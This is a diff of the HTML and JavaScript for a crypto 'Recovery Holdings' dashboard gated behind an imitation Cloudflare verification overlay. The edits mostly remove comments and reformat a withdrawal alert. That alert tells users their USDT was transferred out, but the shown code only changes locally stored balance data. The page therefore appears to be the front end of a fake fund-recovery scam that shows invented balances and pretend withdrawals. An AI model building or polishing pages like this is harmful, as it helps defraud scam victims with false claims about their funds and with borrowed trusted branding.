@@ -7,11 +7,6 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
   <style>
     /* ===== Cloudflare Verification Overlay ===== */
-    body, html {
-      margin: 0; padding: 0; height: 100%; width: 100%;
-      font-family: 'Segoe UI', 'Arial', 'Inter', sans-serif;
-      background: #f3f3f3;
-    }
     #cloudflare-verify-overlay {
       position: fixed;
       z-index: 99999;
@@ -68,7 +63,6 @@
       #cloudflare-verify-box { min-width: unset; padding: 1em 0.5em; }
     }
 
-    /* ===== Original platform styles below (from your main code) ===== */
     :root {
       --primary: #0e7ee4;
       --secondary: #2dd4bf;
@@ -124,9 +118,6 @@
       z-index: 2;
     }
 
-    /* ... rest of your main styles (unchanged, see previous code) ... */
-    /* Due to space, leaving out the rest of your CSS, but it is unchanged from your last version! */
-
     /* ===== Floating Support Button ===== */
     .floating-support-btn {
       position: fixed;
@@ -177,6 +168,7 @@
     @media (max-width: 500px) {
       .floating-support-btn { left: 4px; bottom: 8px; font-size: 0.97em; }
     }
+    /* ... your other existing CSS ... */
   </style>
 </head>
 <body>
@@ -196,7 +188,7 @@
     </div>
   </div>
 
-  <!-- ======== The rest of your site, hidden until verification ======= -->
+  <!-- ====== Main Site Content ====== -->
   <div id="main-site-content" style="display:none;">
 
     <!-- Full background image for both login & dashboard -->
@@ -449,7 +441,6 @@
       withdrawBtn.onclick = () => {
         withdrawForm.style.display = withdrawForm.style.display === 'none' ? 'flex' : 'none';
       };
-      // --------- CHANGED ALERT MESSAGE HERE -------------
       withdrawForm.onsubmit = function(e) {
         e.preventDefault();
         const amount = parseFloat(document.getElementById('withdraw-amount').value);
@@ -463,12 +454,16 @@
         userData.holding = currentBalance;
         setUserData(userEmail, userData);
         updateDashboardBalances();
-        alert("Withdrawal request submitted to:\n" + address + "\nAmount: " + amount + " USDT\n\nCrypto transferred out of Recovery Holdings. Please contact the recipient platform for your transaction receipt.");
+        alert(
+          "Withdrawal request submitted to:\n" +
+          address +
+          "\nAmount: " + amount + " USDT\n\n" +
+          "Crypto transferred out of Recovery Holdings. Please contact the recipient platform for your transaction receipt."
+        );
         withdrawForm.style.display = 'none';
         document.getElementById('withdraw-amount').value = '';
         document.getElementById('withdraw-address').value = '';
       };
-      // --------------------------------------------------
       // Personal Recovery Dashboard Logic
       const personalBtn = document.getElementById('personal-request-btn');
       const personalBalance = document.getElementById('personal-balance-amount');
